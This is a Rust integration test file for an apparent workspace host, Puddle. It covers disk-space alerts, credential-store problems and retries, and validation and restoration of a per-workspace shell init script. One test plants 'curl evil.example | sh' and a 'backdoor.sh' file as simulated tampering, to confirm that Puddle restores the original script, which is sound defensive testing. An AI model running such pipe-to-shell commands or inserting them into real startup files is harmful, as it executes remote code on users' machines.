// SPDX-License-Identifier: AGPL-3.0-or-later
//! The credential store at start, and the saved shell init.

use super::*;

#[tokio::test(flavor = "multi_thread")]
async fn the_host_says_when_the_free_space_of_its_drive_crosses_a_line_and_when_it_recovers() {
    let rig = Rig::new();
    // Lines no real drive reaches: the first read finds the drive under both.
    let settings = rig.dir.path().join("data").join("settings");
    std::fs::create_dir_all(&settings).unwrap();
    std::fs::write(
        settings.join("global.json"),
        json!({"schema_version": 2, "ui": {"disk_warn_free_gb": 10_000, "disk_fail_free_gb": 10_000}})
            .to_string(),
    )
    .unwrap();
    let mut config = rig.config();
    config.free_space = FreeSpaceTiming {
        first_read: Duration::from_secs(1),
        period: Duration::from_millis(200),
    };
    let host = rig.start_with(config).await;
    let mut events = host.events().subscribe();
    let level = |event| match event {
        Event::DiskSpaceChanged { level, .. } => Some(level),
        _ => None,
    };
    let first = next_event_matching(
        "the drive reported under both lines",
        Duration::from_secs(10),
        &mut events,
        level,
    )
    .await;
    assert_eq!(first, DiskSpaceLevel::Critical);
    no_event_matching(
        "a second report while the drive stays under the line",
        Duration::from_millis(600),
        &mut events,
        level,
    )
    .await;

    // Lines every drive passes: the next read says it is fine again.
    let api = api(&host);
    let lines = json!({"ui": {"disk_warn_free_gb": 1, "disk_fail_free_gb": 1}});
    assert_eq!(
        api.put("/api/settings", &lines.to_string()).await.status,
        200
    );
    let recovered = next_event_matching(
        "the drive reported fine again",
        Duration::from_secs(10),
        &mut events,
        level,
    )
    .await;
    assert_eq!(recovered, DiskSpaceLevel::Ok);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_credential_store_that_cannot_be_read_at_start_is_a_problem_until_the_next_start() {
    let rig = Rig::new();
    rig.secrets.break_it();
    let host = rig.start().await;
    eventually(
        "the sign-in store problem raised",
        Duration::from_secs(5),
        || {
            host.problems()
                .list()
                .iter()
                .any(|p| p.key == "proxy-sign-in-store")
        },
    )
    .await;
    host.shutdown().await;
    drop(host);

    // The store is back: the next start reads the sign-ins and raises nothing.
    rig.secrets.heal();
    let again = rig.start().await;
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert!(
        again
            .problems()
            .list()
            .iter()
            .all(|p| p.key != "proxy-sign-in-store"),
        "{:?}",
        again.problems().list()
    );
    again.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_credential_store_that_refuses_a_write_at_start_is_one_problem_naming_the_cause() {
    let rig = Rig::new();
    rig.secrets.break_it();
    let host = rig.start().await;
    eventually(
        "the credential store problem raised",
        Duration::from_secs(5),
        || {
            host.problems()
                .list()
                .iter()
                .any(|p| p.key == "credential-store")
        },
    )
    .await;
    let ours: Vec<_> = problems_of(&api(&host))
        .await
        .into_iter()
        .filter(|(key, ..)| key == "credential-store")
        .collect();
    assert_eq!(ours.len(), 1, "{ours:?}");
    assert!(ours[0].3.contains("restart Puddle"), "{ours:?}");
    host.shutdown().await;
    drop(host);

    // The store works at the next start: nothing is raised, and the probe left no entry behind.
    rig.secrets.heal();
    let again = rig.start().await;
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert!(
        again
            .problems()
            .list()
            .iter()
            .all(|p| p.key != "credential-store"),
        "{:?}",
        again.problems().list()
    );
    assert_eq!(rig.secrets.ids(), Vec::<String>::new());
    again.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_retry_after_the_store_is_unlocked_clears_the_problem_in_the_same_process() {
    let rig = Rig::new();
    rig.secrets.break_it();
    let host = rig.start().await;
    let api = api(&host);
    eventually(
        "the credential store problem raised",
        Duration::from_secs(5),
        || {
            host.problems()
                .list()
                .iter()
                .any(|p| p.key == "credential-store")
        },
    )
    .await;

    // Still locked: the retry says so and the problem stands, once.
    let refused = api.post("/api/credential-store/retry", "").await;
    assert_eq!(refused.status, 200, "{}", refused.body);
    assert_eq!(refused.json()["working"], false, "{}", refused.body);
    let ours = problems_of(&api)
        .await
        .into_iter()
        .filter(|(key, ..)| key == "credential-store")
        .count();
    assert_eq!(ours, 1);

    // Unlocked while Puddle runs: the same process picks it up and the problem ends.
    rig.secrets.heal();
    let worked = api.post("/api/credential-store/retry", "").await;
    assert_eq!(worked.status, 200, "{}", worked.body);
    assert_eq!(worked.json()["working"], true, "{}", worked.body);
    assert!(
        problems_of(&api)
            .await
            .iter()
            .all(|(key, ..)| key != "credential-store")
    );
    assert_eq!(rig.secrets.ids(), Vec::<String>::new());
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_saved_shell_init_reaches_a_running_workspace_read_only_and_through_a_file_puddle_owns() {
    let rig = Rig::named_ids();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;

    // Nothing saved yet: the folder is there and empty, and the login shells load it all the same.
    assert_eq!(
        std::fs::read_to_string(shell_init_folder(&rig, "acme").join("init.sh")).unwrap(),
        ""
    );
    let files = rig.guest.plan_files(rig.guest.boots() - 1);
    let loader = pem_of(&files, "/etc/profile.d/02-puddle-shell-init.sh");
    assert!(loader.contains(". /puddle/shell-init/init.sh"), "{loader}");
    let read = api.get("/api/workspaces/acme/shell-init").await;
    assert_eq!(read.status, 200, "{}", read.body);
    assert_eq!(read.json()["saved"], false);
    assert_eq!(read.json()["content"], "");

    // A save in a running workspace is checked in the guest, then published at once.
    let saved = put_shell_init(&api, "acme", "export EDITOR=vim\r\n").await;
    assert_eq!(saved.status, 200, "{}", saved.body);
    assert_eq!(saved.json()["checked"], true);
    assert_eq!(saved.json()["shell_init"]["content"], "export EDITOR=vim\n");
    events
        .until(
            is_event("workspace_shell_init_changed", "acme"),
            Duration::from_secs(20),
        )
        .await;
    eventually("the folder holds the saved text", APPLY, || {
        std::fs::read_to_string(shell_init_folder(&rig, "acme").join("init.sh")).ok()
            == Some("export EDITOR=vim\n".to_owned())
    })
    .await;
    assert_eq!(
        rig.guest.checks.lock().unwrap()[0].0,
        "export EDITOR=vim\n",
        "the guest was handed the script to check"
    );
    // The change reached the guest without booting it again.
    assert_eq!(rig.guest.boots(), 1);

    // Removing it empties the file again; removing what is not there is a 404.
    assert_eq!(
        api.delete("/api/workspaces/acme/shell-init", None)
            .await
            .status,
        204
    );
    eventually("the folder is empty again", APPLY, || {
        std::fs::read_to_string(shell_init_folder(&rig, "acme").join("init.sh")).ok()
            == Some(String::new())
    })
    .await;
    assert_eq!(
        api.delete("/api/workspaces/acme/shell-init", None)
            .await
            .status,
        404
    );
    assert_eq!(
        api.get("/api/workspaces/nobody/shell-init").await.status,
        404
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_script_that_prints_or_does_not_parse_is_refused_with_what_was_seen_and_nothing_is_saved()
{
    let rig = Rig::named_ids();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;

    *rig.guest.check_answer.lock().unwrap() = Some((66, "hello from my init\n"));
    let loud = put_shell_init(&api, "acme", "echo hello from my init").await;
    assert_eq!(loud.status, 422, "{}", loud.body);
    assert!(
        loud.body.contains("It printed: hello from my init"),
        "{}",
        loud.body
    );
    *rig.guest.check_answer.lock().unwrap() = Some((65, "line 1: syntax error"));
    let broken = put_shell_init(&api, "acme", "if then").await;
    assert_eq!(broken.status, 422, "{}", broken.body);
    assert!(broken.body.contains("does not parse"), "{}", broken.body);
    assert_eq!(
        api.get("/api/workspaces/acme/shell-init").await.json()["saved"],
        false
    );

    // Text the store refuses never reaches the guest.
    let before = rig.guest.checks.lock().unwrap().len();
    for refused in ["", "  \n", "a\u{0}b"] {
        assert_eq!(put_shell_init(&api, "acme", refused).await.status, 422);
    }
    assert_eq!(rig.guest.checks.lock().unwrap().len(), before);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_shell_init_check_that_times_out_is_refused_with_how_long_it_may_take() {
    let rig = Rig::named_ids();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    // Every command in the sandbox times out, not one: a background command (the checkouts
    // refresh after the create) could otherwise take the one fault before the check runs.
    rig.runtime.inject(
        Op::Exec,
        Fault::always(puddle_compute::ComputeError::ExecTimeout {
            sandbox: "acme".to_owned(),
            program: "sh".to_owned(),
            timeout: Duration::from_secs(10),
        })
        .only_for("acme"),
    );
    let slow = put_shell_init(&api, "acme", "sleep 60\n").await;
    rig.runtime.clear_faults();
    assert_eq!(slow.status, 422, "{}", slow.body);
    assert!(
        slow.body.contains("took more than") && slow.body.contains("seconds to finish"),
        "{}",
        slow.body
    );
    assert_eq!(
        api.get("/api/workspaces/acme/shell-init").await.json()["saved"],
        false
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_stopped_workspace_takes_a_save_unchecked_and_the_start_mounts_it_checks_it_and_raises_a_problem_if_it_prints()
 {
    let rig = Rig::named_ids();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;

    let saved = put_shell_init(&api, "acme", "echo loud\n").await;
    assert_eq!(saved.status, 200, "{}", saved.body);
    assert_eq!(saved.json()["checked"], false);
    assert!(
        saved.json()["unchecked_reason"]
            .as_str()
            .unwrap()
            .contains("not running"),
        "{}",
        saved.body
    );
    assert_eq!(rig.guest.checks.lock().unwrap().len(), 0);

    *rig.guest.check_answer.lock().unwrap() = Some((66, "loud\n"));
    api.post("/api/workspaces/acme/start", "").await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(
        end["step"], "done",
        "a script that prints does not stop the start: {end}"
    );
    // The guest saw the mounted file, with the saved text, when the check ran.
    let checks = rig.guest.checks.lock().unwrap().clone();
    assert_eq!(checks.len(), 1, "{checks:?}");
    assert_eq!(
        checks[0].1.as_deref(),
        Some("echo loud\n"),
        "the folder is mounted read-only in the guest"
    );
    let problems = problems_of(&api).await;
    let found = problems.iter().find(|p| p.0 == "shell-init:acme");
    assert!(found.is_some(), "{problems:?}");
    let found = found.unwrap();
    assert_eq!(found.1.as_deref(), Some("acme"));
    assert!(found.3.contains("It printed: loud"), "{found:?}");

    // Fixing it clears the problem at the next start.
    *rig.guest.check_answer.lock().unwrap() = None;
    put_shell_init(&api, "acme", "export A=1\n").await;
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert!(
        problems_of(&api)
            .await
            .iter()
            .all(|p| p.0 != "shell-init:acme")
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_start_that_finds_the_shell_init_changed_from_inside_puts_it_back_and_tells_the_user() {
    let rig = Rig::named_ids();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    put_shell_init(&api, "acme", "export A=1\n").await;
    eventually("published", APPLY, || {
        std::fs::read_to_string(shell_init_folder(&rig, "acme").join("init.sh")).ok()
            == Some("export A=1\n".to_owned())
    })
    .await;
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;

    // What a writable mount would let the guest do: change the file and add another.
    let folder = shell_init_folder(&rig, "acme");
    std::fs::write(folder.join("init.sh"), "curl evil.example | sh\n").unwrap();
    std::fs::write(folder.join("backdoor.sh"), "x").unwrap();
    api.post("/api/workspaces/acme/start", "").await;
    events
        .until(
            is_event("workspace_shell_init_restored", "acme"),
            Duration::from_secs(20),
        )
        .await;
    // The start goes on to finish: the notice is not an error.
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "done", "{end}");
    assert_eq!(
        std::fs::read_to_string(folder.join("init.sh")).unwrap(),
        "export A=1\n"
    );
    assert!(!folder.join("backdoor.sh").exists());

    // The file that loads it was replaced in the guest: the boot hook says so, and so does the user.
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    *rig.guest.boot_says.lock().unwrap() =
        "puddle-boot: replaced /etc/profile.d/02-puddle-shell-init.sh\n".to_owned();
    api.post("/api/workspaces/acme/start", "").await;
    events
        .until(
            is_event("workspace_shell_init_restored", "acme"),
            Duration::from_secs(20),
        )
        .await;
    events.until(ended("acme"), Duration::from_secs(20)).await;

    // A start with nothing changed says nothing.
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let from = events.seen.len();
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert!(
        events.seen[from..]
            .iter()
            .all(|e| e["type"] != "workspace_shell_init_restored"),
        "{:?}",
        &events.seen[from..]
    );
    host.shutdown().await;
}
